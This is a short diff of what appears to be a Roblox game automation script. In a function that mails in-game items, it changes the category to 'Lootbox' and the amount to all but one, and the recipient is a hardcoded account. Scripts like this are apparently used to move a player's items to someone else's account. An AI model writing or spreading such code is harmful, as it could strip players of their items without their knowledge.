@@ -1120,9 +1120,9 @@ local function SendBucketMail()
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
-                [3] = "Misc",
+                [3] = "Lootbox",
                 [4] = woodengiftuid,
-                [5] = woodengiftamount
+                [5] = woodengiftamount - 1
             }
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
             wait(3)
